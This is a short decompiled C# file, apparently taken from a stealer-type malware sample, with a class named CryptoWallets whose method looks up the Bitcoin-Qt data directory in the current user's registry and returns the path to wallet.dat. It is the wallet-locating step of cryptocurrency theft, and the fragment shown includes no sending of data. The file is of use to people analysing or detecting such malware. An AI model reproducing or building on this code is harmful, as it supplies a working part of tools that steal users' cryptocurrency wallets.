using System;
using Microsoft.Win32;

// Token: 0x02000016 RID: 22
internal static class CryptoWallets
{
	// Token: 0x06000042 RID: 66
	public static string get_bitcoin()
	{
		string result;
		try
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
			{
				result = registryKey.GetValue("strDataDir").ToString() + "wallet.dat";
			}
		}
		catch
		{
			result = "";
		}
		return result;
	}
}
